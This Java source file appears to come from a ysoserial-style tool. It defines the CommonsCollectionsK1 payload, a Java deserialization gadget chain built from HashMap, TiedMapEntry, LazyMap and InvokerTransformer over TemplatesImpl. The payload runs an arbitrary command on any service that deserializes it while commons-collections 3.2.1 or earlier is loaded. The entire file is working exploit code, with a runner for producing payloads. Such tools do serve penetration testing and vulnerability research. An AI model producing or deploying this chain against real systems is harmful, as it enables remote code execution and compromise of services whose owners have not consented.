package dogeser.payloads;

import dogeser.payloads.annotation.Authors;
import dogeser.payloads.annotation.Dependencies;
import dogeser.payloads.util.Gadgets;
import dogeser.payloads.util.PayloadRunner;
import dogeser.payloads.util.Reflections;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

/*
Gadget chain:
     HashMap
       TiedMapEntry.hashCode
         TiedMapEntry.getValue
           LazyMap.decorate
             InvokerTransformer
               templates...
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@dogeser.payloads.annotation.Authors({Authors.KORLR})
public class CommonsCollectionsK1 extends dogeser.payloads.util.PayloadRunner implements ObjectPayload<Map> {

    public Map getObject(final String command) throws Exception {
        Object tpl = Gadgets.createTemplatesImpl(command);
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        HashMap<String, String> innerMap = new HashMap<String, String>();
        Map m = LazyMap.decorate(innerMap, transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, tpl);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return outerMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsK1.class, args);
    }
}
